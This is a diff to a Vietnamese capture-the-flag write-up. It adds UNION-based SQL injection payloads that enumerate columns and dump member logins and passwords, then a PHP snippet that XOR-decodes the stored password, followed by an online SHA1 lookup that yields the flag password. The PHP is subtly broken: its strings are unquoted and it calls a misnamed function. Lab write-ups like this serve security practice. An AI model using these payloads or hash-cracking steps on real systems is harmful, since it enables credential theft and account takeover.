@@ -27,12 +27,13 @@ Tiếp theo Xác định số cột bằng 4
 <img width="1498" height="374" alt="image" src="https://github.com/user-attachments/assets/e177b12b-f4da-49ef-91ea-d05fd75f6f15" />
 
 
+Xác định cột
 ```sql
 1000 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema = DATABASE() and table_name = 0x6D656D626572  -- -
 ```
 <img width="1492" height="320" alt="image" src="https://github.com/user-attachments/assets/e07ccd93-3ab8-42be-846a-01b5a351caad" />
 
-
+Xác định password
 
 ```sql
 1000 union select 1,group_concat(member_login),3,group_concat(member_password) from member  -- -
@@ -164,3 +165,40 @@ if($_GET['action'] == "members"){
 ```
 
 Ở đây chúng ta thấy được cái password nhập vào , nó được so sánh với password trong database được decode base64 ra rồi bỏ vào hàm stringxor() và so sánh với password bên ngoài , vậy thì cái password lúc đầu của chúng ta lấy được trong database bảo sao mà không đúng , nó đã được encode các thứ rồi 
+
+Decode base64 ra ta được : `VkE1UUExY0NWUWdQWHdFQVh3WlZWVnNIQmd0ZlVWQmFWMVFFQXdJRlZBSldBd0JSQzF0UlZBPT0=`
+
+Viết lại 
+```php
+<?php
+$key = c92fcd618967933ac463feb85ba00d5a7ae52842;
+$password = VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA==;
+$password_decode = base64_decode($password);
+function stringxor($o1, $o2) {
+    $res = '';
+    for($i=0;$i<strlen($o1);$i++)
+        $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        
+    return $res;
+}
+$result = string($key, $password_decode);
+echo $result;
+?>
+```
+Kết quả chúng ta có
+```
+77be4fc97f77f5f48308942bb6e32aacabed9cef
+```
+Nhưng chưa hết 
+```php
+$pass = sha1($_POST['password']);
+```
+Password nhập vào lại bị mã hóa thành sha1 , vậy tức là lúc này để lấy lại mật khẩu đúng thì phải bẻ được cái mã hóa sha1 ấy . Bạn vào `https://crackstation.net/` , bỏ cái kết quả chúng ta tìm được kia vào trong và Crash . Nó sẽ so sánh cái mã sha1 kia với tất cả các mã có sẵn trong kho mã của nó , nếu có cái nào khớp thì trả về kết quả . CHứ chúng ta không thể decode được bởi vì không có key để code
+
+Kết quả là:
+```
+superpassword
+```
+
+D0ne Challenge này nhé !!
+
+
